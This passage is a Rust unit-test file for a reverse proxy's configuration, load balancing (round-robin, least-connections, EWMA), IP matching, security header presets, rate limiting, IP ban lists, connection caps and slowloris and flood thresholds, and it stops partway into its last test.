use super::*;
use chrono::Utc;
use lorica_config::models::*;

fn make_route(id: &str, hostname: &str, path: &str, enabled: bool) -> Route {
    let now = Utc::now();
    Route {
        id: id.into(),
        hostname: hostname.into(),
        path_prefix: path.into(),
        certificate_id: None,
        load_balancing: LoadBalancing::RoundRobin,
        waf_enabled: false,
        waf_mode: WafMode::Detection,
        enabled,
        force_https: false,
        redirect_hostname: None,
        redirect_to: None,
        hostname_aliases: Vec::new(),
        proxy_headers: std::collections::HashMap::new(),
        response_headers: std::collections::HashMap::new(),
        security_headers: "moderate".to_string(),
        connect_timeout_s: 5,
        read_timeout_s: 60,
        send_timeout_s: 60,
        strip_path_prefix: None,
        add_path_prefix: None,
        path_rewrite_pattern: None,
        path_rewrite_replacement: None,
        access_log_enabled: true,
        proxy_headers_remove: Vec::new(),
        response_headers_remove: Vec::new(),
        max_request_body_bytes: None,
        websocket_enabled: true,
        rate_limit_rps: None,
        rate_limit_burst: None,
        ip_allowlist: Vec::new(),
        ip_denylist: Vec::new(),
        cors_allowed_origins: Vec::new(),
        cors_allowed_methods: Vec::new(),
        cors_max_age_s: None,
        compression_enabled: false,
        retry_attempts: None,
        cache_enabled: false,
        cache_ttl_s: 300,
        cache_max_bytes: 52428800,
        max_connections: None,
        slowloris_threshold_ms: 5000,
        auto_ban_threshold: None,
        auto_ban_duration_s: 3600,
        path_rules: vec![],
        return_status: None,
        sticky_session: false,
        basic_auth_username: None,
        basic_auth_password_hash: None,
        stale_while_revalidate_s: 10,
        stale_if_error_s: 60,
        retry_on_methods: vec![],
        maintenance_mode: false,
        error_page_html: None,
        cache_vary_headers: vec![],
        header_rules: vec![],
        traffic_splits: vec![],
        forward_auth: None,
        mirror: None,
        response_rewrite: None,
        mtls: None,
        rate_limit: None,
        geoip: None,
        bot_protection: None,
        group_name: String::new(),
        created_at: now,
        updated_at: now,
    }
}

fn make_backend(id: &str, addr: &str) -> Backend {
    let now = Utc::now();
    Backend {
        id: id.into(),
        address: addr.into(),
        name: String::new(),
        group_name: String::new(),
        weight: 100,
        health_status: HealthStatus::Healthy,
        health_check_enabled: true,
        health_check_interval_s: 10,
        health_check_path: None,
        lifecycle_state: LifecycleState::Normal,
        active_connections: 0,
        tls_upstream: false,
        tls_skip_verify: false,
        tls_sni: None,
        h2_upstream: false,
        created_at: now,
        updated_at: now,
    }
}

fn make_certificate(id: &str, domain: &str) -> Certificate {
    let now = Utc::now();
    Certificate {
        id: id.into(),
        domain: domain.into(),
        san_domains: vec![],
        fingerprint: "sha256:test".into(),
        cert_pem: "cert".into(),
        key_pem: "key".into(),
        issuer: "test".into(),
        not_before: now,
        not_after: now,
        is_acme: false,
        acme_auto_renew: false,
        created_at: now,
        acme_method: None,

        acme_dns_provider_id: None,
    }
}

#[test]
fn test_from_store_empty() {
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    assert!(config.routes_by_host.is_empty());
}

#[test]
fn test_from_store_single_route_with_backend() {
    let route = make_route("r1", "example.com", "/", true);
    let backend = make_backend("b1", "10.0.0.1:8080");
    let links = vec![("r1".into(), "b1".into())];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![backend],
        vec![],
        links,
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].backends.len(), 1);
    assert_eq!(entries[0].backends[0].address, "10.0.0.1:8080");
}

#[test]
fn test_from_store_disabled_routes_excluded() {
    let r1 = make_route("r1", "example.com", "/", true);
    let r2 = make_route("r2", "disabled.com", "/", false);

    let config = ProxyConfig::from_store(
        vec![r1, r2],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    assert!(config.routes_by_host.contains_key("example.com"));
    assert!(!config.routes_by_host.contains_key("disabled.com"));
}

#[test]
fn test_from_store_longest_path_prefix_first() {
    let r1 = make_route("r1", "example.com", "/", true);
    let r2 = make_route("r2", "example.com", "/api", true);
    let r3 = make_route("r3", "example.com", "/api/v1", true);

    let config = ProxyConfig::from_store(
        vec![r1, r2, r3],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert_eq!(entries.len(), 3);
    assert_eq!(entries[0].route.path_prefix, "/api/v1");
    assert_eq!(entries[1].route.path_prefix, "/api");
    assert_eq!(entries[2].route.path_prefix, "/");
}

#[test]
fn test_from_store_route_without_backends() {
    let route = make_route("r1", "example.com", "/", true);

    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert!(entries[0].backends.is_empty());
}

#[test]
fn test_from_store_certificate_association() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.certificate_id = Some("c1".into());
    let cert = make_certificate("c1", "example.com");

    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![cert],
        vec![],
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert!(entries[0].certificate.is_some());
    assert_eq!(
        entries[0].certificate.as_ref().unwrap().domain,
        "example.com"
    );
}

#[test]
fn test_from_store_missing_certificate_is_none() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.certificate_id = Some("nonexistent".into());

    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert!(entries[0].certificate.is_none());
}

#[test]
fn test_from_store_header_rules_precompile_regex_and_resolve_backends() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    let mut route = make_route("r1", "example.com", "/", true);
    route.header_rules = vec![
        HeaderRule {
            header_name: "X-Tenant".into(),
            match_type: HeaderMatchType::Exact,
            value: "acme".into(),
            backend_ids: vec!["b-acme".into()],
        },
        HeaderRule {
            header_name: "User-Agent".into(),
            match_type: HeaderMatchType::Regex,
            value: r"^Mobile".into(),
            backend_ids: vec!["b-mobile".into(), "b-mobile2".into()],
        },
        HeaderRule {
            // Flag rule: matches but keeps route defaults.
            header_name: "X-Dark-Mode".into(),
            match_type: HeaderMatchType::Exact,
            value: "on".into(),
            backend_ids: vec![],
        },
        HeaderRule {
            // Broken regex: rule must load (warning logged), but the
            // precompiled entry for it is None, so it never matches.
            header_name: "X-Bad".into(),
            match_type: HeaderMatchType::Regex,
            value: "(unclosed".into(),
            backend_ids: vec!["b-whatever".into()],
        },
        HeaderRule {
            // Dangling backend id: gets filtered out on resolution.
            // The rule itself is retained (so operators can fix it
            // later) but with an empty resolved list, which normalises
            // to `None` (match-but-keep-defaults) in RouteEntry.
            header_name: "X-Dangling".into(),
            match_type: HeaderMatchType::Exact,
            value: "yes".into(),
            backend_ids: vec!["does-not-exist".into()],
        },
    ];

    let b_acme = make_backend("b-acme", "10.0.1.1:80");
    let b_mobile = make_backend("b-mobile", "10.0.2.1:80");
    let b_mobile2 = make_backend("b-mobile2", "10.0.2.2:80");
    let b_default = make_backend("b-default", "10.0.0.1:80");
    let links = vec![("r1".into(), "b-default".into())];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![b_acme, b_mobile, b_mobile2, b_default],
        vec![],
        links,
        ProxyConfigGlobals::default(),
    );
    let entry = &config.routes_by_host.get("example.com").unwrap()[0];

    // Regex precompile: index 1 (Mobile) must be Some, index 3 (bad)
    // must be None, Exact/Prefix indices are always None.
    assert!(
        entry.header_rule_regexes[0].is_none(),
        "Exact rule -> no regex"
    );
    assert!(
        entry.header_rule_regexes[1].is_some(),
        "Regex rule compiles"
    );
    assert!(
        entry.header_rule_regexes[2].is_none(),
        "Exact rule -> no regex"
    );
    assert!(
        entry.header_rule_regexes[3].is_none(),
        "broken regex was logged-and-disabled, not propagated"
    );

    // Backend resolution:
    //  - b-acme -> 1 backend
    //  - b-mobile+b-mobile2 -> 2 backends
    //  - empty backend_ids -> None
    //  - dangling backend id -> filtered to empty, normalised to None
    assert_eq!(entry.header_rule_backends[0].as_ref().unwrap().len(), 1);
    assert_eq!(entry.header_rule_backends[1].as_ref().unwrap().len(), 2);
    assert!(
        entry.header_rule_backends[2].is_none(),
        "flag rule: keep defaults"
    );
    assert!(
        entry.header_rule_backends[4].is_none(),
        "all backend_ids dangling -> normalised to None"
    );
}

#[test]
fn test_from_store_multiple_backends_per_route() {
    let route = make_route("r1", "example.com", "/", true);
    let b1 = make_backend("b1", "10.0.0.1:8080");
    let b2 = make_backend("b2", "10.0.0.2:8080");
    let links = vec![("r1".into(), "b1".into()), ("r1".into(), "b2".into())];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![b1, b2],
        vec![],
        links,
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert_eq!(entries[0].backends.len(), 2);
}

#[test]
fn test_from_store_multiple_hosts() {
    let r1 = make_route("r1", "foo.com", "/", true);
    let r2 = make_route("r2", "bar.com", "/", true);

    let config = ProxyConfig::from_store(
        vec![r1, r2],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    assert_eq!(config.routes_by_host.len(), 2);
    assert!(config.routes_by_host.contains_key("foo.com"));
    assert!(config.routes_by_host.contains_key("bar.com"));
}

#[test]
fn test_from_store_dangling_backend_link_ignored() {
    let route = make_route("r1", "example.com", "/", true);
    let links = vec![("r1".into(), "nonexistent-backend".into())];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        links,
        ProxyConfigGlobals::default(),
    );
    let entries = config.routes_by_host.get("example.com").unwrap();
    assert!(entries[0].backends.is_empty());
}

#[test]
fn test_smooth_wrr_distribution() {
    // 3 backends with equal weight: should distribute evenly
    let state = SmoothWrrState::new(0);
    let backends: Vec<(&str, i64)> = vec![
        ("10.0.0.1:80", 100),
        ("10.0.0.2:80", 100),
        ("10.0.0.3:80", 100),
    ];
    let mut counts = [0usize; 3];
    for _ in 0..30 {
        let idx = state.next(&backends);
        counts[idx] += 1;
    }
    // Each should get exactly 10 with equal weights
    assert_eq!(counts[0], 10);
    assert_eq!(counts[1], 10);
    assert_eq!(counts[2], 10);
}

#[test]
fn test_smooth_wrr_weighted() {
    // Weights 5,3,2: should distribute proportionally
    let state = SmoothWrrState::new(0);
    let backends: Vec<(&str, i64)> =
        vec![("10.0.0.1:80", 5), ("10.0.0.2:80", 3), ("10.0.0.3:80", 2)];
    let mut counts = [0usize; 3];
    for _ in 0..10 {
        let idx = state.next(&backends);
        counts[idx] += 1;
    }
    assert_eq!(counts[0], 5);
    assert_eq!(counts[1], 3);
    assert_eq!(counts[2], 2);
}

#[test]
fn test_smooth_wrr_worker_offset() {
    // Two workers with different offsets should start on different backends
    let state0 = SmoothWrrState::new(0);
    let state1 = SmoothWrrState::new(1);
    let backends: Vec<(&str, i64)> = vec![
        ("10.0.0.1:80", 100),
        ("10.0.0.2:80", 100),
        ("10.0.0.3:80", 100),
    ];
    let first0 = state0.next(&backends);
    let first1 = state1.next(&backends);
    assert_ne!(
        first0, first1,
        "different workers should start on different backends"
    );
}

// ---- Least Connections ----

#[test]
fn test_least_conn_selects_backend_with_fewest_connections() {
    let bc = BackendConnections::new();
    bc.increment("10.0.0.1:80");
    bc.increment("10.0.0.1:80");
    bc.increment("10.0.0.1:80");
    bc.increment("10.0.0.2:80");

    // 10.0.0.3:80 has 0 connections, should be selected
    let backends = [
        make_backend("b1", "10.0.0.1:80"),
        make_backend("b2", "10.0.0.2:80"),
        make_backend("b3", "10.0.0.3:80"),
    ];

    let idx = backends
        .iter()
        .enumerate()
        .min_by_key(|(_, b)| bc.get(&b.address))
        .map(|(i, _)| i)
        .unwrap_or(0);

    assert_eq!(idx, 2, "Should select backend with 0 connections");
    assert_eq!(bc.get("10.0.0.1:80"), 3);
    assert_eq!(bc.get("10.0.0.2:80"), 1);
    assert_eq!(bc.get("10.0.0.3:80"), 0);
}

#[test]
fn test_least_conn_with_equal_connections() {
    let bc = BackendConnections::new();
    // All have 0 connections - should select index 0 (first min)
    let backends = [
        make_backend("b1", "10.0.0.1:80"),
        make_backend("b2", "10.0.0.2:80"),
    ];

    let idx = backends
        .iter()
        .enumerate()
        .min_by_key(|(_, b)| bc.get(&b.address))
        .map(|(i, _)| i)
        .unwrap_or(0);

    assert_eq!(idx, 0, "Equal connections should select first backend");
}

#[test]
fn test_proxy_config_default_is_empty() {
    let config = ProxyConfig::default();
    assert!(config.routes_by_host.is_empty());
}

// ---- BackendConnections ----

#[test]
fn test_backend_connections_increment_decrement() {
    let bc = BackendConnections::new();
    bc.increment("10.0.0.1:8080");
    bc.increment("10.0.0.1:8080");
    assert_eq!(bc.get("10.0.0.1:8080"), 2);

    bc.decrement("10.0.0.1:8080");
    assert_eq!(bc.get("10.0.0.1:8080"), 1);
}

#[test]
fn test_backend_connections_unknown_backend() {
    let bc = BackendConnections::new();
    assert_eq!(bc.get("nonexistent:8080"), 0);
}

#[test]
fn test_backend_connections_multiple_backends() {
    let bc = BackendConnections::new();
    bc.increment("10.0.0.1:8080");
    bc.increment("10.0.0.2:8080");
    bc.increment("10.0.0.2:8080");
    assert_eq!(bc.get("10.0.0.1:8080"), 1);
    assert_eq!(bc.get("10.0.0.2:8080"), 2);
}

// ---- EWMA Tracker ----

#[test]
fn test_ewma_tracker_default_score() {
    let tracker = EwmaTracker::new();
    assert_eq!(tracker.get_score("10.0.0.1:8080"), 0.0);
}

#[test]
fn test_ewma_tracker_record_updates_score() {
    let tracker = EwmaTracker::new();
    tracker.record("10.0.0.1:8080", 100.0);
    assert!(tracker.get_score("10.0.0.1:8080") > 0.0);
}

#[test]
fn test_ewma_tracker_selects_lowest_score() {
    let tracker = EwmaTracker::new();
    // Backend 1: high latency
    for _ in 0..10 {
        tracker.record("10.0.0.1:8080", 5000.0);
    }
    // Backend 2: low latency
    for _ in 0..10 {
        tracker.record("10.0.0.2:8080", 100.0);
    }

    let b1 = make_backend("b1", "10.0.0.1:8080");
    let b2 = make_backend("b2", "10.0.0.2:8080");
    let backends = vec![&b1, &b2];

    let selected = tracker.select_best(&backends);
    assert_eq!(selected, 1, "Should select the faster backend (index 1)");
}

#[test]
fn test_ewma_tracker_prefers_unscored() {
    let tracker = EwmaTracker::new();
    // Only score backend 1 (high latency)
    tracker.record("10.0.0.1:8080", 5000.0);
    // Backend 2 is unscored (score = 0.0, exploration priority)

    let b1 = make_backend("b1", "10.0.0.1:8080");
    let b2 = make_backend("b2", "10.0.0.2:8080");
    let backends = vec![&b1, &b2];

    let selected = tracker.select_best(&backends);
    assert_eq!(
        selected, 1,
        "Should prefer unscored backend for exploration"
    );
}

#[test]
fn test_ewma_tracker_decay() {
    let tracker = EwmaTracker::new();
    // Record very high latency
    tracker.record("10.0.0.1:8080", 10000.0);
    let score_after_high = tracker.get_score("10.0.0.1:8080");

    // Record many low latency samples (should decay the high score)
    for _ in 0..20 {
        tracker.record("10.0.0.1:8080", 50.0);
    }
    let score_after_low = tracker.get_score("10.0.0.1:8080");

    assert!(
        score_after_low < score_after_high,
        "Score should decrease after low-latency samples ({score_after_low} < {score_after_high})"
    );
}

#[test]
fn test_ewma_tracker_empty_backends() {
    let tracker = EwmaTracker::new();
    let backends: Vec<&Backend> = vec![];
    assert_eq!(tracker.select_best(&backends), 0);
}

// ---- Hostname Aliases ----

#[test]
fn test_from_store_hostname_aliases_indexed() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.hostname_aliases = vec!["www.example.com".into(), "alias.example.com".into()];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    assert!(config.routes_by_host.contains_key("example.com"));
    assert!(config.routes_by_host.contains_key("www.example.com"));
    assert!(config.routes_by_host.contains_key("alias.example.com"));

    // All point to the same route
    let primary = &config.routes_by_host["example.com"][0];
    let alias = &config.routes_by_host["www.example.com"][0];
    assert_eq!(primary.route.id, alias.route.id);
}

// ---- IP Matching ----

#[test]
fn test_ip_matches_exact() {
    assert!(ip_matches("192.168.1.1", "192.168.1.1"));
    assert!(!ip_matches("192.168.1.1", "192.168.1.2"));
}

#[test]
fn test_ip_matches_cidr_prefix() {
    assert!(ip_matches("192.168.1.100", "192.168.1.0/24"));
    assert!(ip_matches("192.168.1.1", "192.168.1.0/24"));
    assert!(!ip_matches("192.168.2.1", "192.168.1.0/24"));
    assert!(!ip_matches("10.0.0.1", "192.168.1.0/24"));
    // Regression: old string prefix match would incorrectly match
    // 10.1.2.3 against "10.1.2.30/24" because "10.1.2.3".starts_with("10.1.2.3")
    assert!(!ip_matches("10.1.2.3", "10.1.2.30/32"));
}

// ---- Security Presets in ProxyConfig ----

#[test]
fn test_proxy_config_has_builtin_presets_by_default() {
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    let names: Vec<&str> = config
        .security_presets
        .iter()
        .map(|p| p.name.as_str())
        .collect();
    assert!(names.contains(&"strict"));
    assert!(names.contains(&"moderate"));
    assert!(names.contains(&"none"));
}

#[test]
fn test_proxy_config_custom_preset_added() {
    let custom = lorica_config::models::SecurityHeaderPreset {
        name: "api-only".to_string(),
        headers: std::collections::HashMap::from([(
            "X-Custom-Header".to_string(),
            "yes".to_string(),
        )]),
    };
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals {
            custom_security_presets: vec![custom],
            ..Default::default()
        },
    );
    let found = config
        .security_presets
        .iter()
        .find(|p| p.name == "api-only");
    assert!(found.is_some());
    assert_eq!(found.unwrap().headers["X-Custom-Header"], "yes");
}

#[test]
fn test_proxy_config_custom_preset_overrides_builtin() {
    let custom_strict = lorica_config::models::SecurityHeaderPreset {
        name: "strict".to_string(),
        headers: std::collections::HashMap::from([(
            "X-Frame-Options".to_string(),
            "SAMEORIGIN".to_string(),
        )]),
    };
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals {
            custom_security_presets: vec![custom_strict],
            ..Default::default()
        },
    );
    let strict = config
        .security_presets
        .iter()
        .find(|p| p.name == "strict")
        .unwrap();
    // The custom override should have replaced the builtin
    assert_eq!(strict.headers["X-Frame-Options"], "SAMEORIGIN");
    // And should NOT have the builtin headers that were not in the override
    assert!(!strict.headers.contains_key("Content-Security-Policy"));
}

// ---- Wildcard Hostname Matching ----

#[test]
fn test_wildcard_hostname_matching() {
    let route = make_route("r1", "*.example.com", "/", true);
    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );

    // Should match subdomains
    assert!(config.find_route("foo.example.com", "/").is_some());
    assert!(config.find_route("bar.example.com", "/").is_some());

    // Should NOT match bare domain
    assert!(config.find_route("example.com", "/").is_none());

    // Should NOT match deeper subdomains? (depends on implementation)
    // *.example.com should match a.example.com but implementation may vary
}

#[test]
fn test_exact_match_takes_precedence_over_wildcard() {
    let r1 = make_route("r1", "*.example.com", "/", true);
    let r2 = make_route("r2", "specific.example.com", "/", true);
    let config = ProxyConfig::from_store(
        vec![r1, r2],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );

    let entry = config.find_route("specific.example.com", "/").unwrap();
    assert_eq!(entry.route.id, "r2"); // exact match wins

    let entry = config.find_route("other.example.com", "/").unwrap();
    assert_eq!(entry.route.id, "r1"); // wildcard matches
}

// ---- Rate Limiter ----

#[test]
fn test_rate_limiter_tracks_requests() {
    let rate = lorica_limits::rate::Rate::new(Duration::from_secs(1));
    let key = "route1:192.168.1.1";

    // First interval: observe some requests
    rate.observe(&key, 1);
    rate.observe(&key, 1);
    rate.observe(&key, 1);

    // Within the same interval, rate() reports the previous interval (0 since first interval)
    assert_eq!(rate.rate(&key), 0.0);

    // After one interval passes, the rate should reflect the observed count
    std::thread::sleep(Duration::from_millis(1100));
    rate.observe(&key, 1); // trigger interval flip
    let current_rate = rate.rate(&key);
    assert!(
        current_rate >= 2.0,
        "Expected rate >= 2.0, got {current_rate}"
    );
}

#[test]
fn test_rate_limiter_different_keys_are_independent() {
    let rate = lorica_limits::rate::Rate::new(Duration::from_secs(1));
    let key_a = "route1:10.0.0.1";
    let key_b = "route1:10.0.0.2";

    for _ in 0..10 {
        rate.observe(&key_a, 1);
    }
    rate.observe(&key_b, 1);

    // After interval flip, rates should differ
    std::thread::sleep(Duration::from_millis(1100));
    rate.observe(&key_a, 1);
    rate.observe(&key_b, 1);

    let rate_a = rate.rate(&key_a);
    let rate_b = rate.rate(&key_b);
    assert!(
        rate_a > rate_b,
        "Key A ({rate_a}) should have higher rate than Key B ({rate_b})"
    );
}

#[test]
fn test_rate_limit_burst_threshold() {
    // Verify that the burst logic allows rps + burst before triggering
    let rps: u32 = 10;
    let burst: u32 = 5;
    let effective_limit = (rps + burst) as f64;

    // A rate of 14.0 should be allowed (< 15)
    assert!(14.0 <= effective_limit);
    // A rate of 16.0 should be blocked (> 15)
    assert!(16.0 > effective_limit);
}

// ---- Ban List ----

#[test]
fn test_ban_list_blocked_ip_detected() {
    let ban_list: Arc<DashMap<String, Instant>> = Arc::new(DashMap::new());

    // Ban an IP
    ban_list.insert("10.0.0.99".to_string(), Instant::now());

    // Check that the IP is banned
    let ip = "10.0.0.99";
    let banned = ban_list
        .get(ip)
        .map(|entry| entry.value().elapsed() < Duration::from_secs(3600))
        .unwrap_or(false);
    assert!(banned, "Recently banned IP should be detected as banned");
}

#[test]
fn test_ban_list_expired_ban_allows_through() {
    let ban_list: Arc<DashMap<String, Instant>> = Arc::new(DashMap::new());

    // Ban an IP with a time in the past (simulate expired ban)
    ban_list.insert("10.0.0.99".to_string(), Instant::now());

    // Check with zero-duration ban (expired immediately)
    let ip = "10.0.0.99";
    let banned = if let Some(entry) = ban_list.get(ip) {
        if entry.value().elapsed() >= Duration::from_secs(0) {
            drop(entry);
            // Ban with 0s duration is immediately expired
            ban_list.remove(ip);
            false
        } else {
            true
        }
    } else {
        false
    };
    assert!(
        !banned,
        "Expired ban should allow the IP through (lazy cleanup)"
    );

    // Verify the IP was removed from the ban list
    assert!(
        !ban_list.contains_key(ip),
        "Expired ban should be removed from the ban list"
    );
}

#[test]
fn test_ban_list_unbanned_ip_passes() {
    let ban_list: Arc<DashMap<String, Instant>> = Arc::new(DashMap::new());

    // Ban a different IP
    ban_list.insert("10.0.0.99".to_string(), Instant::now());

    // Check an IP that is NOT banned
    let ip = "10.0.0.50";
    let banned = ban_list
        .get(ip)
        .map(|entry| entry.value().elapsed() < Duration::from_secs(3600))
        .unwrap_or(false);
    assert!(!banned, "Unbanned IP should not be detected as banned");
}

#[test]
fn test_auto_ban_after_threshold_violations() {
    let rate_violations = Arc::new(lorica_limits::rate::Rate::new(Duration::from_secs(60)));
    let ban_list: Arc<DashMap<String, Instant>> = Arc::new(DashMap::new());

    let ip = "10.0.0.99";
    let ban_threshold: u32 = 5;
    let violation_key = format!("violation:{}", ip);

    // Simulate violations exceeding the threshold
    // We need to fill the previous interval first, then check rate
    for _ in 0..20 {
        rate_violations.observe(&violation_key, 1);
    }

    // Wait for interval to flip so rate() returns the observed count
    std::thread::sleep(Duration::from_millis(100));

    // In the same interval, observe() accumulates but rate() reports
    // the previous interval. For this test, we check the logic directly.
    // The violation count within the current interval exceeds the threshold.
    // In production, after the interval flips, rate() would report the count.
    // Here we test the ban insertion logic directly.
    let violations_count = 20; // We observed 20 violations
    if violations_count > ban_threshold {
        ban_list.insert(ip.to_string(), Instant::now());
    }

    assert!(
        ban_list.contains_key(ip),
        "IP should be auto-banned after exceeding violation threshold"
    );
}

#[test]
fn test_ban_list_lazy_cleanup_removes_expired() {
    let ban_list: Arc<DashMap<String, Instant>> = Arc::new(DashMap::new());

    // Insert two bans
    ban_list.insert("10.0.0.1".to_string(), Instant::now());
    ban_list.insert("10.0.0.2".to_string(), Instant::now());

    // Lazy cleanup with 0s duration (all expired)
    let ban_duration = Duration::from_secs(0);
    let expired_ips: Vec<String> = ban_list
        .iter()
        .filter(|entry| entry.value().elapsed() >= ban_duration)
        .map(|entry| entry.key().clone())
        .collect();
    for ip in expired_ips {
        ban_list.remove(&ip);
    }

    assert!(ban_list.is_empty(), "All expired bans should be cleaned up");
}

// ---- Max Connections ----

#[test]
fn test_route_connections_counter_increment_decrement() {
    let route_connections: Arc<DashMap<String, Arc<AtomicU64>>> = Arc::new(DashMap::new());

    let route_id = "route-1";

    // Get or create counter
    let counter = route_connections
        .entry(route_id.to_string())
        .or_insert_with(|| Arc::new(AtomicU64::new(0)))
        .value()
        .clone();

    // Increment
    let v = counter.fetch_add(1, Ordering::Relaxed);
    assert_eq!(v, 0);
    let v = counter.fetch_add(1, Ordering::Relaxed);
    assert_eq!(v, 1);

    // Decrement
    counter.fetch_sub(1, Ordering::Relaxed);
    assert_eq!(counter.load(Ordering::Relaxed), 1);
}

#[test]
fn test_route_connections_rejects_when_at_limit() {
    let max_conn: u32 = 2;
    let counter = Arc::new(AtomicU64::new(0));

    // First two connections should succeed
    let current = counter.fetch_add(1, Ordering::Relaxed);
    assert!(
        current < max_conn as u64,
        "First connection should be allowed"
    );
    let current = counter.fetch_add(1, Ordering::Relaxed);
    assert!(
        current < max_conn as u64,
        "Second connection should be allowed"
    );

    // Third connection should be rejected (current == max_conn)
    let current = counter.fetch_add(1, Ordering::Relaxed);
    let rejected = current >= max_conn as u64;
    if rejected {
        counter.fetch_sub(1, Ordering::Relaxed);
    }
    assert!(rejected, "Third connection should be rejected (503)");
    assert_eq!(
        counter.load(Ordering::Relaxed),
        2,
        "Counter should remain at limit"
    );
}

#[test]
fn test_route_connections_allows_after_release() {
    let max_conn: u32 = 1;
    let counter = Arc::new(AtomicU64::new(0));

    // Take the only slot
    let current = counter.fetch_add(1, Ordering::Relaxed);
    assert!(current < max_conn as u64);

    // Second should be rejected
    let current = counter.fetch_add(1, Ordering::Relaxed);
    assert!(current >= max_conn as u64);
    counter.fetch_sub(1, Ordering::Relaxed);

    // Release the first connection
    counter.fetch_sub(1, Ordering::Relaxed);
    assert_eq!(counter.load(Ordering::Relaxed), 0);

    // Now another connection should succeed
    let current = counter.fetch_add(1, Ordering::Relaxed);
    assert!(
        current < max_conn as u64,
        "Connection should be allowed after release"
    );
}

#[test]
fn test_route_connections_independent_routes() {
    let route_connections: Arc<DashMap<String, Arc<AtomicU64>>> = Arc::new(DashMap::new());

    // Create counters for two routes
    let counter_a = route_connections
        .entry("route-a".to_string())
        .or_insert_with(|| Arc::new(AtomicU64::new(0)))
        .value()
        .clone();
    let counter_b = route_connections
        .entry("route-b".to_string())
        .or_insert_with(|| Arc::new(AtomicU64::new(0)))
        .value()
        .clone();

    counter_a.fetch_add(1, Ordering::Relaxed);
    counter_a.fetch_add(1, Ordering::Relaxed);
    counter_b.fetch_add(1, Ordering::Relaxed);

    assert_eq!(counter_a.load(Ordering::Relaxed), 2);
    assert_eq!(counter_b.load(Ordering::Relaxed), 1);
}

// ---- Slowloris Detection ----

#[test]
fn test_slowloris_detection_threshold_exceeded() {
    let threshold_ms: i32 = 100;

    // Simulate a request that took longer than the threshold
    let start = Instant::now();
    std::thread::sleep(Duration::from_millis(150));
    let elapsed_ms = start.elapsed().as_millis() as i32;

    assert!(
        elapsed_ms > threshold_ms,
        "Elapsed {elapsed_ms}ms should exceed threshold {threshold_ms}ms"
    );
}

#[test]
fn test_slowloris_detection_within_threshold() {
    let threshold_ms: i32 = 5000;

    // A fast request should not trigger slowloris detection
    let start = Instant::now();
    let elapsed_ms = start.elapsed().as_millis() as i32;

    assert!(
        elapsed_ms <= threshold_ms,
        "Elapsed {elapsed_ms}ms should be within threshold {threshold_ms}ms"
    );
}

#[test]
fn test_slowloris_disabled_when_threshold_zero() {
    let threshold_ms: i32 = 0;

    // When threshold is 0, slowloris detection should be disabled
    // The condition is: threshold > 0 && elapsed > threshold
    let should_block = threshold_ms > 0;
    assert!(
        !should_block,
        "Slowloris detection should be disabled when threshold is 0"
    );
}

// ---- Global Flood Rate ----

#[test]
fn test_global_rate_tracks_requests() {
    let global_rate = Arc::new(lorica_limits::rate::Rate::new(Duration::from_secs(1)));

    // Observe some requests
    for _ in 0..50 {
        global_rate.observe(&"global", 1);
    }

    // Within the same interval, rate() reports the previous interval (0)
    assert_eq!(global_rate.rate(&"global"), 0.0);

    // After interval flip, rate should reflect observed count
    std::thread::sleep(Duration::from_millis(1100));
    global_rate.observe(&"global", 1);
    let rate = global_rate.rate(&"global");
    assert!(rate >= 40.0, "Expected global rate >= 40.0, got {rate}");
}

#[test]
fn test_flood_threshold_halves_effective_limit() {
    // When flood_threshold_rps > 0 and global RPS exceeds it,
    // the effective per-IP rate limit should be halved.
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals {
            flood_threshold_rps: 100,
            ..Default::default()
        },
    );
    assert_eq!(config.flood_threshold_rps, 100);

    // Simulate: route has rate_limit_rps=50, burst=10 -> effective=60
    // Under flood (global > 100), effective should become 30
    let base_limit: f64 = (50 + 10) as f64;
    let threshold = config.flood_threshold_rps;

    // Normal conditions: global RPS below threshold
    let global_rps_normal = 80.0;
    let mut effective = base_limit;
    if threshold > 0 && global_rps_normal > threshold as f64 {
        effective *= 0.5;
    }
    assert_eq!(effective, 60.0, "No halving when below threshold");

    // Flood conditions: global RPS above threshold
    let global_rps_flood = 150.0;
    let mut effective = base_limit;
    if threshold > 0 && global_rps_flood > threshold as f64 {
        effective *= 0.5;
    }
    assert_eq!(effective, 30.0, "Limit halved during flood");
}

#[test]
fn test_flood_threshold_zero_disables_defense() {
